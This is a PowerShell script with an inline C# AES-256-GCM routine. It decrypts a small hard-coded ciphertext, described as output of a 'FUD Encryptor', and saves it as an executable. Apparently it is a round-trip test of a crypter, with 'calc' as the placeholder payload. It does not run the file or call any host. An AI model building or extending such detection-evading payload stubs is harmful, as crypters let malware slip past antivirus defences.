# Decrypts AES-256-GCM payload from FUD Encryptor
# Usage: .\decrypt_payload.ps1

Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Security.Cryptography;

public class AESGCMHelper {
    public static byte[] Decrypt(byte[] key, byte[] iv, byte[] ciphertext) {
        using (AesGcm aes = new AesGcm(key)) {
            byte[] plaintext = new byte[ciphertext.Length];
            byte[] tag = new byte[16];
            
            // Split ciphertext from auth tag (last 16 bytes)
            byte[] actualCiphertext = new byte[ciphertext.Length - 16];
            Array.Copy(ciphertext, actualCiphertext, ciphertext.Length - 16);
            Array.Copy(ciphertext, ciphertext.Length - 16, tag, 0, 16);
            
            aes.Decrypt(iv, actualCiphertext, tag, plaintext);
            return plaintext;
        }
    }
}
"@

# Configuration from your JSON
$keyB64 = "EncvDgA1Wf3ZkMPqvLX+lAr1U/rgQs27xHVtZSKVAsc="
$ivStr = "+Ag2T6hUkOXc82oa"
$ciphertextB64 = "u9pQ8OmoTsYK7fHetNir2/eZoUxreew/tl11XuKVPxLnvppYYhS/bLq3pxUv3QUow6+y/QmkVT/j+TilURvIEQkMY2OR45cwdkkN6pivqKLgtLUiXEqsyGpVWOZevOs4cCZcV9dp8+h2CU2oc3cyufQbFD3PcJKviKmI6W4OuJI4wkYiDlGzdpGUE+rqZe1J2L6NGPvAcRGYVJDGKFswlrJru2yNKxHJwZ8aNOxq9dCSqBxkDhsL6tdwe6gnI/Da"

# Decode
$key = [System.Convert]::FromBase64String($keyB64)
$iv = [System.Text.Encoding]::UTF8.GetBytes($ivStr)
$ciphertext = [System.Convert]::FromBase64String($ciphertextB64)

Write-Host "Key length: $($key.Length) bytes (should be 32)"
Write-Host "IV length: $($iv.Length) bytes (should be 12)"
Write-Host "Ciphertext length: $($ciphertext.Length) bytes"

try {
    # Decrypt
    $plaintext = [AESGCMHelper]::Decrypt($key, $iv, $ciphertext)
    
    # Write output
    [System.IO.File]::WriteAllBytes("d:\rawrxd\calcrawr_decrypted.exe", $plaintext)
    Write-Host "[+] Decryption successful! Saved to calcrawr_decrypted.exe" -ForegroundColor Green
    Write-Host "File size: $($plaintext.Length) bytes"
} catch {
    Write-Host "[-] Decryption failed: $_" -ForegroundColor Red
}
